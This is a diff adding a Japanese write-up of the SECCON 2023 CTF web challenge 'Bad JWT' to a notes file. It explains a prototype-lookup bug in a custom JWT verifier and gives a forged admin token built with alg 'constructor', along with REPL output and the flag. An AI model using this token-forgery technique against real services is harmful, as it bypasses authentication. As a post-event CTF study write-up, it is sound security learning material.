@@ -13,6 +13,7 @@ Web問は後で復習します。
 <!-- code_chunk_output -->
 
 - [misc/readme 2023](#miscreadme-2023)
+- [web/Bad JWT](#webbad-jwt)
 
 <!-- /code_chunk_output -->
 
@@ -153,3 +154,136 @@ path:
 ```text
 SECCON{y3t_4n0th3r_pr0cf5_tr1ck:)}
 ```
+
+## web/Bad JWT
+
+107 solved / 98 points
+
+解けなかった問題。
+JWTが使われており、認可処理としてなぜか正しいトークンを再計算して比較している。  
+`isAdmin`が含まれるトークンを発行できれば勝ち。
+
+- 該当箇所: `src/index.js`
+
+```js
+app.use((req, res, next) => {
+	try {
+		const token = req.cookies.session;
+		const payload = jwt.verify(token, secret);
+		req.session = payload;
+	} catch (e) {
+		return res.status(400).send('Authentication failed');
+	}
+	return next();
+})
+
+app.get('/', (req, res) => {
+	if (req.session.isAdmin === true) {
+		return res.send(FLAG);
+	} else {
+		return res.status().send('You are not admin!');
+	}
+});
+```
+
+- 該当箇所: `src/jwt.js`
+
+```js
+const algorithms = {
+	hs256: (data, secret) => 
+		base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
+	hs512: (data, secret) => 
+		base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
+}
+```
+
+```js
+const createSignature = (header, payload, secret) => {
+	const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
+	const signature = algorithms[header.alg.toLowerCase()](data, secret);
+	return signature;
+}
+
+const parseToken = (token) => {
+	const parts = token.split('.');
+	if (parts.length !== 3) throw Error('Invalid JWT format');
+	
+	const [ header, payload, signature ] = parts;
+	const parsedHeader = parsePart(header);
+	const parsedPayload = parsePart(payload);
+	
+	return { header: parsedHeader, payload: parsedPayload, signature }
+}
+```
+
+```js
+const verify = (token, secret) => {
+	const { header, payload, signature: expected_signature } = parseToken(token);
+
+	const calculated_signature = createSignature(header, payload, secret);
+	
+	const calculated_buf = Buffer.from(calculated_signature, 'base64');
+	const expected_buf = Buffer.from(expected_signature, 'base64');
+
+	if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
+		throw Error('Invalid signature');
+	}
+
+	return payload;
+}
+```
+
+トークンのシグネチャ部分を再計算して、送信されたシグネチャと比較している。  
+`Buffer.compare(calculated_buf, expected_buf)`が0になるようにしないといけない。
+
+- `calculated_buf`
+
+シグネチャ計算時の箇所を見ると、`algorithms`のキーに任意の文字列を入れられる。
+
+```js
+const signature = algorithms[header.alg.toLowerCase()](data, secret);
+```
+
+algorithmsは生成されたオブジェクトのため、`algorithms["constructor"]`が使える。
+
+```node
+> algorithms = {}
+{}
+> algorithms["constructor"]
+[Function: Object]
+> signature = algorithms["constructor"]("header.payload","secret")
+[String: 'header.payload']
+```
+
+後は組み立てるだけ。
+
+```text
+header: eyJhbGciOiJjb25zdHJ1Y3RvciJ9  <- {"alg":"constructor"}
+payload: eyJpc0FkbWluIjp0cnVlfQ       <- {"isAdmin":true}
+```
+
+signatureは`${header}.${payload}`ではあるが、トークン内に`.`を3つ以上使えないためそのままは不可。  
+`Buffer.from(<文字列>, 'base64')`では<文字列>の`.`を消しても同じ値になることを利用する。
+
+```node
+> Buffer.from('eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ', 'base64')
+<Buffer 7b 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d 7b 22 69 73 41 64 6d 69 6e 22 3a 74 72 75 65 7d>
+> Buffer.from('eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ', 'base64')
+<Buffer 7b 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d 7b 22 69 73 41 64 6d 69 6e 22 3a 74 72 75 65 7d>
+```
+
+完成したトークンをクッキーに付けて送ると、フラグがもらえる。
+
+```text
+eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ
+```
+
+- FLAG
+
+```text
+SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
+```
+
+- 所感
+
+後から解法を見て分かったが、なぜ`constructor`に気づかなかったのか。
